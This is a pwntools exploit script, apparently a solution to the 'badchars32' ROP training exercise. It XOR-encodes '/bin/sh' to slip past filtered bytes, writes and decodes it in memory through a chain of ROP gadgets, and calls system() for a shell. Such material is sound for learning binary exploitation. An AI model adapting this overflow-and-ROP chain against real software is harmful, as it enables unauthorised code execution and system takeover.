#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./badchars32')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")


def encode(string, badchars="\x00") -> (bytes, int):
    found_key = None

    for key in range(0, 0x100):
        if key in badchars:
            continue

        res = b""
        for s in string:
            res += bytes([s ^ key])

        if not any(b in res for b in badchars):
            found_key = key
            break

    if found_key:
        return res, found_key
    

binsh = b"/bin/sh"
encoded , key = encode(binsh, badchars=[b"b", b"i", b"c", b"/", b" ", b"f", b"n", b"s"])

pop = 0x08048899 # : pop esi ; pop edi ; ret
mov = 0x08048893 # : mov dword ptr [edi], esi ; ret
mem = 0x804a048

pop_xor = 0x08048896 # pop ebx ; pop ecx ; ret
xor = 0x08048890 # : xor byte ptr [ebx], cl ; ret

payload = b"A" * 44

for i in range(len(encoded)):
    payload += (
        p32(pop) +
        p32(encoded[i]) +
        p32(mem + i) +
        p32(mov) +
        p32(pop_xor) +
        p32(mem + i) +
        p32(key) +
        p32(xor)
    )

payload += (
    p32(0x0804844a) + #  : ret
    p32(exe.plt["system"]) +
    b"BBBB" +
    p32(mem)
)

io.sendline(payload)

io.interactive()

